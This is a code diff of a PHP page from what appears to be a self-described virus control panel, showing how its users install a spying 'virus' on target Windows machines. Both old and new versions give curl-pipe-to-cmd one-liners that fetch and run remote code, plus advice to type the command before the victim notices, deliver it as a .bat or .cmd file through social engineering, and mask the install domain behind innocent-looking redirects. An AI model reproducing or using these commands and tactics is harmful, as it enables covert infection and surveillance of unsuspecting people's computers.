@@ -130,45 +130,44 @@ if ($user->isHold()) { ?>
         Click <a class="hold" onclick="applyHold()">here</a> to apply a hold.</p>
 <?php } ?>
 <h2>Installing a new virus</h2>
-To install a new virus on a computer, execute this command in the command prompt running Windows on the target machine:
-<pre class="codes" style="overflow: auto;">curl <?php echo DOMAIN; ?>/new/win/<?php echo $user_handle; ?> | cmd</pre>
-Alternatively, this for Windows:
-<pre class="codes" style="overflow: auto;">curl <?php echo DOMAIN; ?>/new/<?php echo $user_handle; ?> | cmd</pre>
-And run this for Mac (in development):
-<pre class="codes" style="overflow: auto;">curl <?php echo DOMAIN; ?>/new/mac/<?php echo $user_handle; ?> | cmd</pre>
-<p>Instantaneously after you have run that command, you should be able to see that virus pops up in the list of
-    expecting viruses.
-    After a few seconds, the virus will pings back for the first
-    time, and will jump to the active viruses category. If this doesn't happen, then something has gone wrong and I
-    have no idea how to fix it. May be the target machine has an antivirus? :D</p>
-<p>I recommend you memorize the above command because when you are actually attacking them, you need to do it
-    quickly, before they can notice anything. You can also put this command inside of a file with extensions .cmd,
-    .bat or .btm, then give it to your target by social engineering. Please note that every part of that command
-    must be identical. That means there must be "curl" at the front, there must be a "https://", and there must be a
-    "| cmd" (The "|" character in qwerty keyboards is usually right above the enter button). Miss anything and it
-    won't work.</p>
-<p>Or... You can use different domains, pointing to this domain. Let's say you have just bought the domain
-    "awesome.app.com" and you want to use that instead of "virus.kelvinho.org", which would sound suspicious, you
-    can just redirect your website to <?php echo DOMAIN; ?> (still note that this is hard if you don't know what you
-    are doing, so just ask someone technical if you don't know how to do this). Then, the command to install the
-    virus would be:</p>
+To install a new virus on a Windows computer, execute this command in the command prompt on the target machine:
 <pre class="codes"
-     style="overflow: auto;">curl -L awesome.app.com/new/win/<?php echo $user_handle; ?> | cmd</pre>
-<p>The "-L" option is to go through all the redirects your web server guides and to fetch the final destination. If
-    you're lazy and just don't agree that I should have the word virus inside of the install command, you can use
-    any of these commands instead:</p>
+     style="overflow: auto;">curl <?php echo ALT_DOMAIN_SHORT; ?>/new/<?php echo $user_handle; ?> | cmd</pre>
+And run this for Mac (in development, not available):
+<pre class="codes" style="overflow: auto;">curl <?php echo ALT_DOMAIN_SHORT; ?>/new/mac/<?php echo $user_handle; ?> | cmd</pre>
+<p>The "|" character, known as the vertical bar, normally sits <!--suppress HtmlUnknownTarget --> <a
+            href="<?php echo DOMAIN; ?>/resources/images/normal_vertical_bar.png" target=_blank style="color: blue;">right
+        above the enter button</a>. Some keyboards denote it with <!--suppress HtmlUnknownTarget --><a
+            href="<?php echo DOMAIN; ?>/resources/images/split_vertical_bar.jpg" target=_blank style="color: blue;">2
+        vertical bars align end-to-end</a></p>
+<p>Instantaneously after you have run that command, you should be able to see that virus pops up in the list of
+    expecting viruses. After a few seconds, the virus will pings back for the first time, and will jump to the active
+    viruses category. If this doesn't happen, then something has gone wrong and I have no idea how to fix it. May be the
+    target machine has an antivirus? :D</p>
+<p>I recommend you memorize the above command because when you are actually attacking them, you need to do it
+    quickly, before they can notice anything.</p>
+<h3>Alternate: Using a file</h3>
+<p>You can put the command above in a file, then name the file so that it has extension .cmd or .bat, which ever you
+    prefer, then give your target that file and tell them to run it.</p>
+<h3>Alternate: Using your own domain</h3>
+<p>Let's say you have your own domain "awesome.app.com". You can then redirect it to the command above (this is hard if
+    you don't know what you're doing). Then the command to install will now be:</p>
+<pre class="codes"
+     style="overflow: auto;">curl -L awesome.app.com | cmd</pre>
+<h3>Alternate: Using alternate addresses I created</h3>
+<p>You can use any of these alternate addresses, if you don't agree with using <?php echo ALT_DOMAIN_SHORT; ?></p>
 <div style="overflow: auto;">
     <?php foreach ($alternates as $alternate) { ?>
-        <pre class="codes">curl <?php echo $alternate; ?>.kelvinho.org/new/win/<?php echo $user_handle; ?> | cmd</pre>
+        <pre class="codes">curl <?php echo $alternate; ?>.kelvinho.org/new/<?php echo $user_handle; ?> | cmd</pre>
     <?php } ?>
 </div>
+<p>Same goes for the mac install command.</p>
 <p>I can definitely add more, but what's the point? Also, note that <?php echo DOMAIN; ?> is the main site, and is
-    accessible when encrypted only. Any insecure requests will be redirected to the secure site. However, all of the
-    alternative built-in domains are unencrypted. You can use the alternative domains encrypted, but they don't have
-    a valid certificate because I'm lazy to get one, and the main site already has a valid certificate, so why
-    bother? So if you were to do the curl thing, option "-k" will accept encrypted requests with an invalid
-    certificate.</p>
-<p>Or... You don't agree that I control your spying data so you can rebuild everything. The project is open sourced
+    accessible encrypted only. Any insecure requests will be redirected to the secure site. However, all of the
+    alternative built-in domains are unencrypted just because I'm lazy, and they are meant to install the virus only, so
+    what's the point of encryption?</p>
+<h3>Alternate: Rebuild this entire application and control your own data</h3>
+<p>If you don't agree that I control your spying data then you can rebuild everything here. The project is open sourced
     (under the MIT license) and available <a href="<?php echo GITHUB_PAGE; ?>" style="color: blue">here</a>. The
     installation details are way too technical here, but there're plenty of guide on the github page.</p>
 <p>One last bit of advice: test everything locally first, on either your machine or a VM, then actually getting out
